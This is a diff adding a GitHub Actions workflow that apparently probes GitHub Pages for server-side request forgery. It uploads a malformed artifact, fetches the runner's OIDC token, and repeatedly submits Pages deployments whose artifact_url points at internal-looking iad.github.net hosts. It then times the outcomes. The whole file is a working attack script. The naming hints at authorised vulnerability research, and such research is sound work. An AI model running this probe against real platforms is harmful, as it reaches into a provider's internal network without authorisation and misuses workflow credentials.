@@ -1,0 +1,85 @@
+name: reach-arms
+on:
+  workflow_dispatch: {}
+permissions: { contents: write, pages: write, id-token: write }
+jobs:
+  arms:
+    runs-on: ubuntu-latest
+    environment: { name: github-pages }
+    steps:
+      - name: make a deliberately malformed artifact
+        run: |
+          set -u
+          mkdir -p art && echo "not-a-pages-artifact" > art/payload.txt
+          tar -czf art/art.tar.gz -C art payload.txt
+          rm -f art/payload.txt
+          ls -l art
+      - uses: actions/upload-artifact@v4
+        with: { name: github-pages, path: art/art.tar.gz, retention-days: 1 }
+      - name: run the arms
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -u
+          API="https://api.github.com/repos/$GITHUB_REPOSITORY"
+          AH="Authorization: token $GH_TOKEN"
+          AC="Accept: application/vnd.github+json"
+
+          # ---- resolve the artifact we just uploaded ----
+          sleep 5
+          curl -s -H "$AH" -H "$AC" "$API/actions/runs/$GITHUB_RUN_ID/artifacts" > arts.json
+          AID=$(jq -r '.artifacts[0].id // empty' arts.json)
+          echo "ARTIFACT_ID=$AID"
+          jq -r '.artifacts[] | "  artifact \(.id) name=\(.name) expired=\(.expired) size=\(.size_in_bytes)"' arts.json
+          [ -z "$AID" ] && { echo "FATAL no artifact"; exit 1; }
+
+          PATHSEG="/zzq-vfy-c7aff89f/not-a-real-path"
+          CANARY="https://ssrf-target.iad.github.net$PATHSEG"
+          SIBLING="https://zzq-vfy-c7aff89f-8f3a.iad.github.net$PATHSEG"
+          NXDOM="https://zzq-vfy-c7aff89f-8f3a.invalid$PATHSEG"
+
+          newsha () {  # throwaway commit -> independent pages_build_version
+            B=$(python3 -c 'import base64,json,sys;print(json.dumps({"message":"arm "+sys.argv[1],"content":base64.b64encode(sys.argv[1].encode()).decode()}))' "$1")
+            curl -s -X PUT -H "$AH" -H "$AC" "$API/contents/arms/$1.txt" -d "$B" | jq -r '.commit.sha'
+          }
+
+          arm () { # name  useid  url
+            NAME="$1"; USEID="$2"; URL="$3"
+            SHA=$(newsha "$NAME")
+            TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r .value)
+            if [ "$USEID" = "yes" ]; then
+              jq -nc --arg u "$URL" --arg s "$SHA" --arg t "$TOKEN" --argjson id "$AID" \
+                '{artifact_id:$id,artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > body.json
+            else
+              jq -nc --arg u "$URL" --arg s "$SHA" --arg t "$TOKEN" \
+                '{artifact_url:$u,pages_build_version:$s,oidc_token:$t,environment:"github-pages"}' > body.json
+            fi
+            T0=$(date +%s)
+            CODE=$(curl -s -o resp.json -w '%{http_code}' -X POST -H "$AH" -H "$AC" "$API/pages/deployments" -d @body.json)
+            DID=$(jq -r '.id // "none"' resp.json); SURL=$(jq -r '.status_url // empty' resp.json)
+            MSG=$(jq -r '.message // ""' resp.json)
+            if [ -z "$SURL" ]; then
+              echo "RESULT|$NAME|post=$CODE|sha=${SHA:0:8}|deployment=$DID|terminal=NO_STATUS_URL|elapsed=0|msg=$MSG"
+              return
+            fi
+            ST="unknown"; EL=0; CENSORED=no
+            for i in $(seq 1 150); do
+              sleep 2
+              ST=$(curl -s -H "$AH" -H "$AC" "$SURL" | jq -r '.status // "unknown"')
+              case "$ST" in
+                deployment_failed|deployment_attempt_error|succeed|deployment_lost|errored) break;;
+              esac
+              [ "$i" = "150" ] && CENSORED=yes
+            done
+            EL=$(( $(date +%s) - T0 ))
+            echo "RESULT|$NAME|post=$CODE|sha=${SHA:0:8}|deployment=${DID:0:12}|terminal=$ST|elapsed=${EL}s|censored=$CENSORED|msg=$MSG"
+          }
+
+          echo "########## ARMS BEGIN ##########"
+          arm VALCTRL-canary-url-alone no  "$CANARY"
+          arm CANARY-1                 yes "$CANARY"
+          arm SIBLING-1                yes "$SIBLING"
+          arm CANARY-2                 yes "$CANARY"
+          arm SIBLING-2                yes "$SIBLING"
+          arm NXDOM-anchor             yes "$NXDOM"
+          echo "########## ARMS END ##########"
